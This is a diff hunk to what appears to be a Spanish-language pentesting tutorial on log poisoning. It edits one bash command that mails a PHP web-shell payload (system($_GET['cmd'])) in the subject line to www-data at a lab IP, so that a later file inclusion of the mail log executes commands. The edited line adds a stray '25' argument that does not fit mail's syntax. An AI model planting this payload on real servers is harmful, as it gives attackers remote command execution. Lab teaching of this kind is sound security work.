@@ -167,7 +167,7 @@ Si logramos incrustar código PHP en el log y que luego sea interpretado, podrem
 Si está abierto el puerto 25, que es el puerto estándar para el protocolo SMTP (envío de correo):
 
 ```bash
-mail -s "<?php system(\$_GET['cmd']); ?>" www-data@10.10.10.10 < /dev/null
+mail -s "<?php system(\$_GET['cmd']); ?>" www-data@172.17.0.2 25 < /dev/null
 ```
 Este comando envía un correo con un payload PHP en el asunto al usuario www-data.
 
